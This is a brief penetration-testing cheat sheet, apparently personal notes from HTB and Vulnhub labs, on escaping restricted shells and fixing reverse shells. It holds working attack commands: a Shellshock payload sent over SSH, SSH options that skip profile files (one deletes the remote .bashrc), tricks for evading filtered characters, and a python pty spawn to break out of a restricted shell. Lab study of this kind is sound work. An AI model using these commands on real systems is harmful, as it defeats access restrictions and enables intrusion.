# Restricted Shell / SSH

**If reverse shell not working :**

* try changing the port to 443 or 80
* try checking for characters breaking the reverse shell

**Evading Badchars in a reverse shell (HTB Sense)**

* Echo abc
* Echo abc/
* Echo abc -
* Check env variables -> env
* HOME= /
* Echo ${HOME}/home
* Optional (Using ASCII to evade badchars)
* Printf “\55” -> -

**Restricted Reverse Shell :**

* To disable profiling in /etc/profile and \~/.profile
* Locate ifconfig
* /sbin/ifconfig
* nice /bin/bash

**SSH :**

```bash
// Ways to no profile
ssh hostname -t "bash --noprofile"
ssh -t user@host bash --norc --noprofile
ssh -t username@hostname /bin/sh
ssh -t user@host "bash --norc --noprofile -c '/bin/rm .bashrc'"

// SSH bash shellshock (Troll2 Vulnhub)
ssh -i noob noob@192.168.0.119 '() { :; }; uname -a'
```

**Bypass restricted shell using : (dipak.pdf)**

* export PATH=/bin/:sbin/:/usr/bin/:$PATH
* payload = "python -c 'import pty;pty.spawn("/bin/bash")'"
